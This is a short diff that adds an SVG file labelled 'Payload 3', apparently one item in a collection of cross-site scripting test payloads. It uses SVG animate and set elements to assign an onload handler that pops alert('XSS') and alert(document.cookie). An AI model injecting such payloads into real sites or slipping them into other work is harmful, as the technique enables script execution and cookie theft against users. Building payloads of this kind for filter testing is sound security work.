@@ -1,0 +1,10 @@
+<!-- Payload 3: Using SVG animation -->
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
+   <animate 
+      attributeName="onload"
+      values="alert('XSS')"
+      begin="0s"
+      dur="1s"
+   />
+   <set attributeName="onload" to="alert(document.cookie)"/>
+</svg>
